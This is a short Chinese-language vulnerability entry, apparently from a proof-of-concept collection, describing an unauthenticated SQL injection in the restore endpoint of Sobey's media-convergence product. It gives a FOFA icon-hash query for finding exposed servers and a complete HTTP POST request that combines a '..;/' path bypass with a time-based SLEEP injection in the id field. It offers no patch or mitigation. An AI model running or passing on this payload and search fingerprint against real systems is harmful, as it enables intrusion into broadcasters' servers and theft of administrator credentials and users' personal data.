# 索贝融媒体restore存在SQL注入漏洞

索贝融媒体产品是成都索贝数码科技股份有限公司（简称索贝）为各级电视台和媒体机构打造的一套集互联网和电视融合生产的解决方案。索贝融媒体 mch/WXArticleInt/restore 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
icon_hash="689611853"
```

## poc

```javascript
POST /sobey-mchEditor/js/..;/mch/WXArticleInt/restore HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

siteCode=&id=1+AND+%28SELECT+2804+FROM+%28SELECT%28SLEEP%285%29%29%29MDfc%29&token=
```
